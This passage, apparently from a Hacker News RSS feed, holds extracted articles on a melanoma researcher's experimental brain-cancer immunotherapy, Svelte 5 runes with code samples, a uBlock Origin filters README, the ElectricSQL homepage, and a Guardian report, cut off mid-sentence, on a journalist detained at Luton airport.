<div id="readability-page-1" class="page"><div><p>Richard Scolyer is at the forefront of melanoma treatment and research, but a devastating cancer diagnosis of his own has made him the self-described "patient zero" in a new frontier of brain cancer treatment.</p><section role="contentinfo" aria-label="key points" data-component="KeyPoints" data-uri="coremedia://teaser/102879824"><h2 data-component="Heading">Key points:</h2><ul data-component="List" role="list"><li data-component="ListItem"><span></span>Richard Scolyer is undergoing a rare treatment because he's both a clinician and cancer researcher</li><li data-component="ListItem"><span></span>The early results have shown a&nbsp;10-fold increase in the immune cells in the tumour</li><li data-component="ListItem"><span></span>His co-medical director Georgina Long said she felt compelled to try something groundbreaking</li></ul></section><p>A medical director of Melanoma Institute Australia, Professor Scolyer was diagnosed with an incurable brain cancer in June.&nbsp;</p><p>Since then, he and his colleagues have gone down a path of experimental treatment, and have given a National Press Club address, announcing they've "generated in 10 weeks discoveries that would normally take years".</p><p>Professor Scolyer said his brain cancer diagnosis came suddenly, and without warning.</p><p>"No one saw it coming, least of all me. I was fit, having represented Australia at the world aquathon championships in Ibiza in early May," he said.</p><p>In June, he travelled to Poland with his wife Katie Nicoll, and the day before had gone hiking in the mountains.</p><p>"I woke the next morning not feeling quite right," he said.</p><p>"I had a brief phone call with my mum back in Tasmania. I don't remember much after that. I know now I had a seizure."</p><p>He was rushed to hospital and after a number of tests, Professor Scolyer was diagnosed with glioblastoma IDH wild-type, a cancer that's considered incurable and usually fatal within six to nine months.</p><p>One of the first phone calls Professor Scolyer's wife made from Poland was to his Melanoma Institute Australia co-medical director, Georgina Long.</p><p>"Nothing had prepared me for that phone call from Katie in Poland," Professor Long said.</p><p>"When I got that call, I got a physical pain like nothing I've ever experienced before and it was grief for what Richard and his family were about to go through and for the thought of losing my dear friend and colleague."</p><figure role="group" data-component="VerticalArticleFigure" aria-labelledby="102879842" data-uri="coremedia://imageproxy/102879842"><img alt="Richard Scolyer and Georgina Long addressing the National Press Club" sizes="(max-width: 543px) 543px," srcset="https://live-production.wcms.abc-cdn.net.au/361b88e01a9b4899cea11d38092791b0?impolicy=wcms_crop_resize&amp;cropH=3333&amp;cropW=4444&amp;xPos=278&amp;yPos=0&amp;width=862&amp;height=647 543w, https://live-production.wcms.abc-cdn.net.au/361b88e01a9b4899cea11d38092791b0?impolicy=wcms_crop_resize&amp;cropH=3333&amp;cropW=5000&amp;xPos=0&amp;yPos=0&amp;width=862&amp;height=575" src="https://live-production.wcms.abc-cdn.net.au/361b88e01a9b4899cea11d38092791b0?impolicy=wcms_crop_resize&amp;cropH=3333&amp;cropW=5000&amp;xPos=0&amp;yPos=0&amp;width=862&amp;height=575" loading="lazy" data-component="Image" data-lazy="true"><p><figcaption id="102879842" data-component="VerticalArticleFigure__figcaption" aria-live="polite"> <!-- -->Richard Scolyer and Georgina Long addressing the National Press Club in Canberra.<span data-component="Byline"><span data-component="Text">(<span>AAP:&nbsp;Bianca De Marchi</span>)</span></span></figcaption></p></figure><h2 data-component="Heading">The melanoma expert takes on glioblastoma</h2><p>Professor Long said after that phone call, she started researching glioblastoma, speaking to experts and looking up clinical trials.</p><p>"It was a barren landscape. You could count the number of immunotherapy clinical trials for glioblastoma almost on one hand," she said.</p><p>With no clinical trials available, Professor Long said she felt obligated to "try something groundbreaking."</p><p>Melanoma Institute Australia has been at the forefront of treatments like immunotherapy, that have drastically improved survival rates for the deadly skin cancer.</p><p>Rather than go down the usual treatment path for glioblastoma of surgery, radiotherapy and chemotherapy, they decided to try to treat Professor Scolyer in a similar way to their melanoma patients.</p><p>"There was initial resistance from some in the oncology community," Professor Scolyer said.</p><p>"But Katie and I spent many hours writing long letters detailing what I wanted to do and why."</p><p>Professor Scolyer was given immunotherapy, designed to activate the immune system to attack the cancer.</p><p>They also used the specific genome of his cancer to design a vaccine to target it.</p><h2 data-component="Heading">Early results 'nothing short of phenomenal'</h2><p>Twelve days after he was given the immunotherapy drugs, Professor Scolyer had surgery to have the bulk of his tumour removed.</p><p>It was then tested, to see if the drugs had an effect.</p><p>"Yes, Richard is a patient of only one, but early scientific results are nothing short of phenomenal," Professor Long said.</p><p>They found there was a 10-fold increase in the immune cells in the tumour, that they were activated against the cancer and they were bound to the drug.</p><p>"Proving something that we'd already shown in melanoma, that there is no blood brain barrier and historically conceptualised, preventing the drugs from reaching the tumour," Professor Long said.</p><p>"We could not have hoped for better results."</p><p>But the pair said it was too early to say whether those scientific results mean a better prognosis for Professor Scolyer.</p><h2 data-component="Heading">The experimental treatment a unique situation</h2><p>Professor Scolyer said at this stage the experimental treatment he has undergone won't be available to other patients.</p><p>"I can only do this because I'm a cancer researcher and clinician and so inherently understand the risks," he said.</p><p>"This treatment may extend or shorten my life."</p><p>The co-medical directors said pharmaceutical companies have been reluctant to invest in glioblastoma research, but their early results mean some are starting to pay attention.</p><p>They are hopeful it will lead to clinical trials.</p><p>They have called for a change in approach to cancer research and treatment, such as looking beyond the confines of one cancer, designing better clinical trials and embedding research in clinical care.</p><p>"We know we're not curing as many cancers as we could," Professor Scolyer said.</p><p>"Today we call on the cancer research field to collectively re-think its approach to tackling cancer. Think big and be courageous."</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Car allergic to vanilla ice cream (1292 pts)]]></title>
            <link>http://www.cs.cmu.edu/~wkw/humour/carproblems.txt</link>
            <guid>37584399</guid>
            <pubDate>Wed, 20 Sep 2023 14:14:12 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="http://www.cs.cmu.edu/~wkw/humour/carproblems.txt">http://www.cs.cmu.edu/~wkw/humour/carproblems.txt</a>, See on <a href="https://news.ycombinator.com/item?id=37584399">Hacker News</a></p>
&lt;Not HTML&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Svelte 5: Runes (412 pts)]]></title>
            <link>https://svelte.dev/blog/runes</link>
            <guid>37584224</guid>
            <pubDate>Wed, 20 Sep 2023 13:59:32 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://svelte.dev/blog/runes">https://svelte.dev/blog/runes</a>, See on <a href="https://news.ycombinator.com/item?id=37584224">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="main"><article> <p>Rethinking 'rethinking reactivity'</p>    <!-- HTML_TAG_START --><p>In 2019, Svelte 3 turned JavaScript into a <a href="https://svelte.dev/blog/svelte-3-rethinking-reactivity">reactive language</a>. Svelte is a web UI framework that uses a compiler to turn declarative component code like this...</p>
<pre><code><span><span>&lt;</span><span>script</span><span>&gt;</span></span>
<span><span>	</span><span>let</span><span> count </span><span>=</span><span> </span><span>0</span><span>;</span></span>
<span></span>
<span><span>	</span><span>function</span><span> </span><span>increment</span><span>() {</span></span>
<span><span>		count </span><span>+=</span><span> </span><span>1</span><span>;</span></span>
<span><span>	}</span></span>
<span><span>&lt;/</span><span>script</span><span>&gt;</span></span>
<span></span>
<span><span>&lt;</span><span>button</span><span> </span><span>on</span><span>:</span><span>click</span><span>=</span><span>{increment}&gt;</span></span>
<span><span>	clicks: {count}</span></span>
<span><span>&lt;/</span><span>button</span><span>&gt;</span></span></code></pre><p>...into tightly optimized JavaScript that updates the document when state like <code>count</code> changes. Because the compiler can 'see' where <code>count</code> is referenced, the generated code is <a href="https://svelte.dev/blog/virtual-dom-is-pure-overhead">highly efficient</a>, and because we're hijacking syntax like <code>let</code> and <code>=</code> instead of using cumbersome APIs, you can <a href="https://svelte.dev/blog/write-less-code">write less code</a>.</p>
<p>A common piece of feedback we get is 'I wish I could write all my JavaScript like this'. When you're used to things inside components magically updating, going back to boring old procedural code feels like going from colour to black-and-white.</p>
<p>Svelte 5 changes all that with <em>runes</em>, which unlock <em>universal, fine-grained reactivity</em>.</p>
<div>
<figure>
<p>
  <iframe src="https://www.youtube-nocookie.com/embed/RVnxF3j3N8U" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p>

<figcaption>Introducing runes</figcaption>
</figure>
</div>

<h2 id="before-we-begin">Before we begin<a href="#before-we-begin"><span>permalink</span></a></h2><p>Even though we're changing how things work under the hood, Svelte 5 should be a drop-in replacement for almost everyone. The new features are opt-in — your existing components will continue to work.</p>
<p>We don't yet have a release date for Svelte 5. What we're showing you here is a work-in-progress that is likely to change!</p>
<h2 id="what-are-runes">What are runes?<a href="#what-are-runes"><span>permalink</span></a></h2><blockquote>
<p><strong>rune</strong> /ro͞on/ <em>noun</em></p>
<p>A letter or mark used as a mystical or magic symbol.</p>
</blockquote>
<p>Runes are symbols that influence the Svelte compiler. Whereas Svelte today uses <code>let</code>, <code>=</code>, the <a href="https://learn.svelte.dev/tutorial/declaring-props"><code>export</code></a> keyword and the <a href="https://learn.svelte.dev/tutorial/reactive-declarations"><code>$:</code></a> label to mean specific things, runes use <em>function syntax</em> to achieve the same things and more.</p>
<p>For example, to declare a piece of reactive state, we can use the <code>$state</code> rune:</p>
<pre><code>&lt;script&gt;
<span>	let count = 0;
</span><span>	let count = $state(0);
</span>
	function increment() {
		count += 1;
	}
&lt;/script&gt;

&lt;button on:click={increment}&gt;
	clicks: {count}
&lt;/button&gt;
</code></pre><p>At first glance, this might seem like a step back — perhaps even <a href="https://twitter.com/stolinski/status/1438173489479958536">un-Svelte-like</a>. Isn't it better if <code>let count</code> is reactive by default?</p>
<p>Well, no. The reality is that as applications grow in complexity, figuring out which values are reactive and which aren't can get tricky. And the heuristic only works for <code>let</code> declarations at the top level of a component, which can cause confusion. Having code behave one way inside <code>.svelte</code> files and another inside <code>.js</code> can make it hard to refactor code, for example if you need to turn something into a <a href="https://learn.svelte.dev/tutorial/writable-stores">store</a> so that you can use it in multiple places.</p>
<h2 id="beyond-components">Beyond components<a href="#beyond-components"><span>permalink</span></a></h2><p>With runes, reactivity extends beyond the boundaries of your <code>.svelte</code> files. Suppose we wanted to encapsulate our counter logic in a way that could be reused between components. Today, you would use a <a href="https://learn.svelte.dev/tutorial/custom-stores">custom store</a> in a <code>.js</code> or <code>.ts</code> file:</p>
<pre><p>ts</p><p><code><p><span>import</span><span> { <data-lsp lsp="(alias) function writable&amp;lt;T>(value?: T | undefined, start?: StartStopNotifier&amp;lt;T> | undefined): Writable&amp;lt;T>&amp;#10;import writable">writable</data-lsp> } </span><span>from</span><span> </span><span>'svelte/store'</span><span>;</span></p><p><span>export</span><span> </span><span>function</span><span> </span><span><data-lsp lsp="function createCounter(): {&amp;#10;  subscribe: (this: void, run: Subscriber&amp;lt;number>, invalidate?: Invalidator&amp;lt;number> | undefined) => Unsubscriber;&amp;#10;  increment: () => void;&amp;#10;}">createCounter</data-lsp></span><span>() {</span></p><p><span>	</span><span>const</span><span> { </span><span><data-lsp lsp="const subscribe: (this: void, run: Subscriber&amp;lt;number>, invalidate?: Invalidator&amp;lt;number> | undefined) => Unsubscriber">subscribe</data-lsp></span><span>,</span><span> </span><span><data-lsp lsp="const update: (this: void, updater: Updater&amp;lt;number>) => void">update</data-lsp></span><span> } </span><span>=</span><span> </span><span><data-lsp lsp="(alias) writable&amp;lt;number>(value?: number | undefined, start?: StartStopNotifier&amp;lt;number> | undefined): Writable&amp;lt;number>&amp;#10;import writable">writable</data-lsp></span><span>(</span><span>0</span><span>);</span></p><p><span>	</span><span>return</span><span> {</span></p><p><span>		<data-lsp lsp="(property) subscribe: (this: void, run: Subscriber&amp;lt;number>, invalidate?: Invalidator&amp;lt;number> | undefined) => Unsubscriber">subscribe</data-lsp></span><span>,</span></p><p><span>		</span><span><data-lsp lsp="(property) increment: () => void">increment</data-lsp></span><span>:</span><span> () </span><span>=&gt;</span><span> </span><span><data-lsp lsp="const update: (this: void, updater: Updater&amp;lt;number>) => void">update</data-lsp></span><span>((<data-lsp lsp="(parameter) n: number">n</data-lsp>) </span><span>=&gt;</span><span> <data-lsp lsp="(parameter) n: number">n</data-lsp> </span><span>+</span><span> </span><span>1</span><span>)</span></p><p><span>	};</span></p><p><span>}</span></p></code></p></pre><p>Because this implements the <em>store contract</em> — the returned value has a <code>subscribe</code> method — we can reference the store value by prefixing the store name with <code>$</code>:</p>
<pre><code>&lt;script&gt;
<span>	import { createCounter } from './counter.js';
</span><span>
</span><span>	const counter = createCounter();
</span><span>	let count = 0;
</span><span>
</span><span>	function increment() {
</span><span>		count += 1;
</span><span>	}
</span>&lt;/script&gt;

<span>&lt;button on:click={increment}&gt;
</span><span>	clicks: {count}
</span><span>&lt;button on:click={counter.increment}&gt;
</span><span>	clicks: {$counter}
</span>&lt;/button&gt;
</code></pre><p>This works, but it's pretty weird! We've found that the store API can get rather unwieldy when you start doing more complex things.</p>
<p>With runes, things get much simpler:</p>
<pre><code><span>import { writable } from 'svelte/store';
</span>
export function createCounter() {
<span>	const { subscribe, update } = writable(0);
</span><span>	let count = $state(0);
</span>
	return {
<span>		subscribe,
</span><span>		increment: () =&gt; update((n) =&gt; n + 1)
</span><span>		get count { return count },
</span><span>		increment: () =&gt; count += 1
</span>   };
}
</code></pre><pre><code>&lt;script&gt;
	import { createCounter } from './counter.js';

	const counter = createCounter();
&lt;/script&gt;

&lt;button on:click={counter.increment}&gt;
<span>	clicks: {$counter}
</span><span>	clicks: {counter.count}
</span>&lt;/button&gt;
</code></pre><p>Note that we're using a <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/get">get property</a> in the returned object, so that <code>counter.count</code> always refers to the current value rather than the value at the time the function was called.</p>
<h2 id="runtime-reactivity">Runtime reactivity<a href="#runtime-reactivity"><span>permalink</span></a></h2><p>Today, Svelte uses <em>compile-time reactivity</em>. This means that if you have some code that uses the <code>$:</code> label to re-run automatically when dependencies change, those dependencies are determined when Svelte compiles your component:</p>
<pre><code><span><span>&lt;</span><span>script</span><span>&gt;</span></span>
<span><span>	</span><span>export</span><span> </span><span>let</span><span> width;</span></span>
<span><span>	</span><span>export</span><span> </span><span>let</span><span> height;</span></span>
<span></span>
<span><span>	</span><span>// the compiler knows it should recalculate `area`</span></span>
<span><span>	</span><span>// when either `width` or `height` change...</span></span>
<span><span>	$</span><span>:</span><span> area </span><span>=</span><span> width </span><span>*</span><span> height;</span></span>
<span></span>
<span><span>	</span><span>// ...and that it should log the value of `area`</span></span>
<span><span>	</span><span>// when _it_ changes</span></span>
<span><span>	$</span><span>:</span><span> </span><span>console</span><span>.log</span><span>(area);</span></span>
<span><span>&lt;/</span><span>script</span><span>&gt;</span></span></code></pre><p>This works well... until it doesn't. Suppose we refactored the code above:</p>
<pre><p>ts</p><p><code><p><span>const</span><span> </span><span><data-lsp lsp="const multiplyByHeight: (width: any) => number">multiplyByHeight</data-lsp></span><span> </span><span>=</span><span> (<data-err><data-lsp lsp="(parameter) width: any">width</data-lsp></data-err>) </span><span>=&gt;</span><span> <data-lsp lsp="(parameter) width: any">width</data-lsp> </span><span>*</span><span> <data-err><data-lsp lsp="any">height</data-lsp></data-err>;</span></p><span><span>Parameter 'width' implicitly has an 'any' type.<br>Cannot find name 'height'.</span><span>7006<br>2304</span></span><span>Parameter 'width' implicitly has an 'any' type.<br>Cannot find name 'height'.</span><p><span>$</span><span>:</span><span> <data-err><data-lsp lsp="any">area</data-lsp></data-err> </span><span>=</span><span> </span><span><data-lsp lsp="const multiplyByHeight: (width: any) => number">multiplyByHeight</data-lsp></span><span>(<data-err><data-lsp lsp="any">width</data-lsp></data-err>);</span></p><span><span>Cannot find name 'area'.<br>Cannot find name 'width'.</span><span>2304<br>2304</span></span><span>Cannot find name 'area'.<br>Cannot find name 'width'.</span></code></p></pre><p>Because the <code>$: area = ...</code> declaration can only 'see' <code>width</code>, it won't be recalculated when <code>height</code> changes. As a result, code is hard to refactor, and understanding the intricacies of when Svelte chooses to update which values can become rather tricky beyond a certain level of complexity.</p>
<p>Svelte 5 introduces the <code>$derived</code> and <code>$effect</code> runes, which instead determine the dependencies of their expressions when they are evaluated:</p>
<pre><code><span><span>&lt;</span><span>script</span><span>&gt;</span></span>
<span><span>	</span><span>let</span><span> { width</span><span>,</span><span> height } </span><span>=</span><span> $</span><span>props</span><span>(); </span><span>// instead of `export let`</span></span>
<span></span>
<span><span>	</span><span>const</span><span> </span><span>area</span><span> </span><span>=</span><span> $</span><span>derived</span><span>(width </span><span>*</span><span> height);</span></span>
<span></span>
<span><span>	$</span><span>effect</span><span>(() </span><span>=&gt;</span><span> {</span></span>
<span><span>		</span><span>console</span><span>.log</span><span>(area);</span></span>
<span><span>	});</span></span>
<span><span>&lt;/</span><span>script</span><span>&gt;</span></span></code></pre><p>As with <code>$state</code>, <code>$derived</code> and <code>$effect</code> can also be used in your <code>.js</code> and <code>.ts</code> files.</p>
<h2 id="signal-boost">Signal boost<a href="#signal-boost"><span>permalink</span></a></h2><p>Like every other framework, we've come to the realisation that <a href="https://knockoutjs.com/">Knockout</a> was right all along.</p>
<p>Svelte 5's reactivity is powered by <em>signals</em>, which are essentially <a href="https://dev.to/this-is-learning/the-evolution-of-signals-in-javascript-8ob">what Knockout was doing in 2010</a>. More recently, signals have been popularised by <a href="https://www.solidjs.com/">Solid</a> and adopted by a multitude of other frameworks.</p>
<p>We're doing things a bit differently though. In Svelte 5, signals are an under-the-hood implementation detail rather than something you interact with directly. As such, we don't have the same API design constraints, and can maximise both efficiency <em>and</em> ergonomics. For example, we avoid the type narrowing issues that arise when values are accessed by function call, and when compiling in server-side rendering mode we can ditch the signals altogether, since on the server they're nothing but overhead.</p>
<p>Signals unlock <em>fine-grained reactivity</em>, meaning that (for example) changes to a value inside a large list needn't invalidate all the <em>other</em> members of the list. As such, Svelte 5 is ridonkulously fast.</p>
<h2 id="simpler-times-ahead">Simpler times ahead<a href="#simpler-times-ahead"><span>permalink</span></a></h2><p>Runes are an additive feature, but they make a whole bunch of existing concepts obsolete:</p>
<ul>
<li>the difference between <code>let</code> at the top level of a component and everywhere else</li>
<li><code>export let</code></li>
<li><code>$:</code>, with all its attendant quirks</li>
<li>different behaviour between <code>&lt;script&gt;</code> and <code>&lt;script context="module"&gt;</code></li>
<li>the store API, parts of which are genuinely quite complicated</li>
<li>the <code>$</code> store prefix</li>
<li><code>$$props</code> and <code>$$restProps</code></li>
<li>lifecycle functions (things like <code>onMount</code> can just be <code>$effect</code> functions)</li>
</ul>
<p>For those of you who already use Svelte, it's new stuff to learn, albeit hopefully stuff that makes your Svelte apps easier to build and maintain. But newcomers won't need to learn all those things — it'll just be in a section of the docs titled 'old stuff'.</p>
<p>This is just the beginning though. We have a long list of ideas for subsequent releases that will make Svelte simpler and more capable.</p>
<h2 id="try-it">Try it!<a href="#try-it"><span>permalink</span></a></h2><p>You can't use Svelte 5 in production yet. We're in the thick of it at the moment and can't tell you when it'll be ready to use in your apps.</p>
<p>But we didn't want to leave you hanging. We've created a <a href="https://svelte-5-preview.vercel.app/">preview site</a> with detailed explanations of the new features and an interactive playground. You can also visit the <code>#svelte-5-runes</code> channel of the <a href="https://svelte.dev/chat">Svelte Discord</a> to learn more. We'd love to have your feedback!</p>
<!-- HTML_TAG_END --></article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: uBlock Origin filters to remove distractions (417 pts)]]></title>
            <link>https://github.com/mig4ng/ublock-origin-filters</link>
            <guid>37584134</guid>
            <pubDate>Wed, 20 Sep 2023 13:53:31 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/mig4ng/ublock-origin-filters">https://github.com/mig4ng/ublock-origin-filters</a>, See on <a href="https://news.ycombinator.com/item?id=37584134">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-target="readme-toc.content">
            <article itemprop="text"><h2 tabindex="-1" dir="auto">ublock-origin-filters</h2>
<p dir="auto">My uBlock Origin filters to remove unnecessary distractions from some websites.</p>
<p dir="auto">For each website I have very specific tasks I do.
I optimize for allowing those tasks, while disabling everything else that might distract me.</p>
<p dir="auto">These are my preferences, feel free to use the filters directly from this repository or fork them.</p>
<p dir="auto">If I miss anything or you think I would benefit from something else, open an issue, pull request or send me an email (my github username at gmail.com).</p>
<h2 tabindex="-1" dir="auto">YouTube</h2>
<p dir="auto"><strong>Objective:</strong> Remove all distractions, recommended videos, auto-play, suggestions (everywhere), shorts. Most of the time I only want to:</p>
<ul dir="auto">
<li>watch a video;</li>
<li>search something;</li>
<li>upload something.</li>
</ul>
<p dir="auto"><em>Note:</em> Right now I am using Unhook (the Firefox extension). It works well but it might be possible to replace it with a filter too (<a href="https://letsblock.it/filters" rel="nofollow">https://letsblock.it/filters</a>).</p>
<h2 tabindex="-1" dir="auto">Twitter</h2>
<p dir="auto"><strong>Objective:</strong> Remove all distractions, feed, sidebar, etc. Most of the time I only want to:</p>
<ul dir="auto">
<li>see the tweet feed in a specific profile I have opened;</li>
<li>see a tweet content and it's comments;</li>
<li>tweet something.</li>
</ul>
<h2 tabindex="-1" dir="auto">LinkedIn</h2>
<p dir="auto"><strong>Objective:</strong> Remove all distractions, feed, sidebar, etc. Most of the time I only want to:</p>
<ul dir="auto">
<li>see a profile, company;</li>
<li>read a specific post;</li>
<li>reply to messages;</li>
<li>post something.</li>
</ul>
</article>
          </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: ElectricSQL, Postgres to SQLite active-active sync for local-first apps (519 pts)]]></title>
            <link>https://electric-sql.com/</link>
            <guid>37584049</guid>
            <pubDate>Wed, 20 Sep 2023 13:46:55 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://electric-sql.com/">https://electric-sql.com/</a>, See on <a href="https://news.ycombinator.com/item?id=37584049">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="docusaurus_skipToContent_fallback"><main><a href="https://electric-sql.com/docs/intro/local-first"></a><div><ul role="tablist" aria-orientation="horizontal"><li role="tab" tabindex="-1" aria-selected="false">Access rules</li><li role="tab" tabindex="0" aria-selected="true">Sync shapes</li><li role="tab" tabindex="-1" aria-selected="false">Live queries</li><li role="tab" tabindex="-1" aria-selected="false">Local writes</li></ul><div role="tabpanel"><div><p>Craft how data syncs <span>on and off </span><span>onto </span> your app using <a href="https://electric-sql.com/docs/usage/data-access/shapes">Shapes</a>.</p><p>Shapes allow you to manage <a href="https://electric-sql.com/docs/intro/sync-controls">dynamic partial replication</a> between Postgres in the cloud and SQLite in the local<!-- -->&nbsp;<!-- -->app.</p></div><div><pre tabindex="0"><code><span><span>const</span><span> shape </span><span>=</span><span> </span><span>await</span><span> db</span><span>.</span><span>projects</span><span>.</span><span>sync</span><span>(</span><span>{</span><span></span><br></span><span><span>  where</span><span>:</span><span> </span><span>{</span><span></span><br></span><span><span>    owner_id</span><span>:</span><span> auth</span><span>.</span><span>user_id</span><span></span><br></span><span><span>  </span><span>}</span><span>,</span><span></span><br></span><span><span>  include</span><span>:</span><span> </span><span>{</span><span></span><br></span><span><span>    issues</span><span>:</span><span> </span><span>{</span><span></span><br></span><span><span>      include</span><span>:</span><span> </span><span>{</span><span></span><br></span><span><span>        comments</span><span>:</span><span> </span><span>{</span><span></span><br></span><span><span>          include</span><span>:</span><span> </span><span>{</span><span></span><br></span><span><span>            author</span><span>:</span><span> </span><span>true</span><span></span><br></span><span><span>          </span><span>}</span><span></span><br></span><span><span>        </span><span>}</span><span></span><br></span><span><span>      </span><span>}</span><span></span><br></span><span><span>    </span><span>}</span><span></span><br></span><span><span>  </span><span>}</span><span></span><br></span><span><span></span><span>}</span><span>)</span><span>;</span><br></span></code></pre></div></div></div><div><div><p><img src="https://electric-sql.com/img/quotes/anurag.png" loading="lazy"></p><h3>Anurag Goel</h3><h4>Founder<span> - </span><a href="https://render.com/">Render</a></h4><p>ElectricSQL is a great choice for a <span>local-first</span> sync layer that you can run anywhere yourself.</p></div><div><p><img src="https://electric-sql.com/img/quotes/johannes.png" loading="lazy"></p><h3>Johannes Schickling</h3><h4>Founder<span> - </span><a href="https://www.prisma.io/">Prisma</a></h4><p>I’m very impressed with ElectricSQL’s approach to sync and their thoughtful API&nbsp;design.</p></div><div><p><img src="https://electric-sql.com/img/quotes/jose.png" loading="lazy"></p><h3>José Valim</h3><h4>Creator<span> - </span><a href="https://elixir-lang.org/">Elixir</a></h4><p>ElectricSQL brings the full power of the Erlang VM to local-first software development.</p></div></div><div><div><ul role="tablist" aria-orientation="horizontal"><li role="tab" tabindex="0" aria-selected="true">Instant reactivity</li><li role="tab" tabindex="-1" aria-selected="false">Realtime multi‑user</li><li role="tab" tabindex="-1" aria-selected="false">Conflict‑free offline</li></ul></div><div><div><p>For</p><h2>Operational simplicity</h2></div><div><ul role="tablist" aria-orientation="horizontal"><li role="tab" tabindex="0" aria-selected="true">Simple to operate</li><li role="tab" tabindex="-1" aria-selected="false">Cheaper to&nbsp;run</li><li role="tab" tabindex="-1" aria-selected="false">Reliable by design</li></ul></div></div><div><ul role="tablist" aria-orientation="horizontal"><li role="tab" tabindex="0" aria-selected="true">Standard open‑source</li><li role="tab" tabindex="-1" aria-selected="false">Drop‑in compatible</li><li role="tab" tabindex="-1" aria-selected="false">Existing applications</li></ul><div role="tabpanel"><div><p><img src="https://electric-sql.com/img/icons/open-source.svg" loading="lazy"></p><h3>Open source</h3><p><span>Apache 2.0 license. Open development on </span><a href="https://github.com/electric-sql/electric">GitHub</a><span> and </span><a href="https://discord.electric-sql.com/">Discord</a>. Contributions welcome.</p></div><div><p><img src="https://electric-sql.com/img/icons/self-host.svg" loading="lazy"></p><h3>Self-host</h3><p>One horizontally scalable sync service. No complex infra or durability requirements.</p></div></div></div><div><p><h2>Join the community</h2></p></div><div><p><h2>Become a design partner</h2></p><p><img loading="lazy" src="https://electric-sql.com/img/home/splash.svg"></p></div></div></main></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[British journalist held by police at Luton airport for five hours without arrest (268 pts)]]></title>
            <link>https://www.theguardian.com/media/2023/sep/20/british-journalist-held-by-police-at-luton-airport-for-five-hours-without-arrest</link>
            <guid>37584038</guid>
            <pubDate>Wed, 20 Sep 2023 13:46:06 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theguardian.com/media/2023/sep/20/british-journalist-held-by-police-at-luton-airport-for-five-hours-without-arrest">https://www.theguardian.com/media/2023/sep/20/british-journalist-held-by-police-at-luton-airport-for-five-hours-without-arrest</a>, See on <a href="https://news.ycombinator.com/item?id=37584038">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="maincontent"><p>A British freelance journalist who previously worked in the Kurdish-controlled part of Syria was held by counter-terrorism police at Luton airport for five hours without being arrested last month under controversial powers of detention.</p><p>Matt Broomfield, 29, said he was met by police as he got off a plane from Belgrade with his girlfriend on 24 August and was taken aside for questioning, where he was asked “do you consider your reporting objective” and his opinions of the British state. <a href="https://www.theguardian.com/uk/police" data-link-name="in body link" data-component="auto-linked-tag">Police</a> told Broomfield they were engaged in “a mopping up operation”. They seized his phone and laptop and have since refused to return them. After the questioning ended, he was allowed to proceed and no police action has followed.</p><p>Broomfield was detained under schedule 7 of the Terrorism Act 2000, used routinely by counter-terrorism officers to question people at airports for up to six hours at a time. Police say it is a tool to keep the public safe, but critics say the power is overused to the point of harassment.</p><p>The National Union of Journalists has written on Broomfield’s behalf to Matt Jukes, the policing lead for counter-terrorism, to ask for a justification for his detainment in the absence of criminal proceedings, and for his computer and phone to be immediately returned.</p><p>Officers focused on Broomfield’s writing, much of which is sympathetic to the <a href="https://www.theguardian.com/world/kurds" data-link-name="in body link" data-component="auto-linked-tag">Kurds</a>, and a three-year period ending in 2020 when he ran a news and information service in Kurdish-controlled north-east Syria. “They asked who I had met and interviewed,” he said.</p><p>Broomfield was held for two months <a href="https://dm-aegean.bordermonitoring.eu/2021/11/10/detained-and-banned-from-europe-a-british-journalist-in-the-eu-migrant-detention-system/?fbclid=IwAR1McCkjqtWtOz6qVdVy13B6xgCMgsaH8zCxJ0g2vFy56wsYfdmxS47offY" data-link-name="in body link">in Greek migrant detention centres</a> in 2021 after being denied permission to cross the border into Italy. He was told he was banned from the EU’s Schengen area at the request of Germany, which he believes was because of his media and advocacy work.</p><p>He was flown to the UK where he was subjected to a schedule 7 stop. After that, Broomfield, who is now based in Belgrade, says he was allowed to re-enter the UK “several times” without issue – until the latest stop last month.</p><p>Kurdish soldiers were instrumental in the defeat of Islamic State in north-east Syria in 2019, with air support from the US and UK, and remain in effect in control of the region. Turkey has long been hostile to the Kurds, who aspire to their own state based on territory in Turkey, Syria, Iraq and Iran.</p><p>Broomfield said: “It seems clear the Schengen ban and my harassment by the UK police are driven by direct or indirect pressure from Turkey, on the basis of my work and reporting in Rojava and around the Kurdish issue.”</p><p>He said the UK should have no interest “in the anti-democratic prosecution of legitimate journalism”.</p><p>British Kurds told the Guardian they were routinely stopped under schedule 7. Ali Gul Ozbek, 58, a pharmacist from Friern Barnet, north London, and a former mayor of Haringey council, said he had been stopped every time he went abroad since around 2012, both on the way out and on the way back.</p><p>The most recent stop was in July when Ozbek, a British citizen, went to visit his uncle in Geneva, Switzerland. “It is a form of torture. They ask the most basic questions that could be answered by a primary school student. I am an ordinary Kurd, I do not have any link with any Kurdish political organisations.”</p><p>Official figures show <a href="https://www.gov.uk/government/statistics/operation-of-police-powers-under-the-terrorism-act-2000-quarterly-update-to-june-2023/operation-of-police-powers-under-the-terrorism-act-2000-and-subsequent-legislation-arrests-outcomes-and-stop-and-search-great-britain-quarterly-u" data-link-name="in body link">2,498 people were stopped</a> under schedule 7 powers in the year to 30 June, down 6% from a year before. The detainees are a wide range of people, including those with the loosest of links to the Kurdish movement.</p><figure data-spacefinder-role="inline" data-spacefinder-type="model.dotcomrendering.pageElements.NewsletterSignupBlockElement"><a data-ignore="global-link-styling" href="#EmailSignup-skip-link-13">skip past newsletter promotion</a><p id="EmailSignup-skip-link-13" tabindex="0" aria-label="after newsletter promotion" role="note">after newsletter promotion</p></figure><p>Ann Marie Davies, from Cardiff, was detained by counter-terrorism police for about four hours at Bristol airport in July as she returned from a holiday in Portugal, her 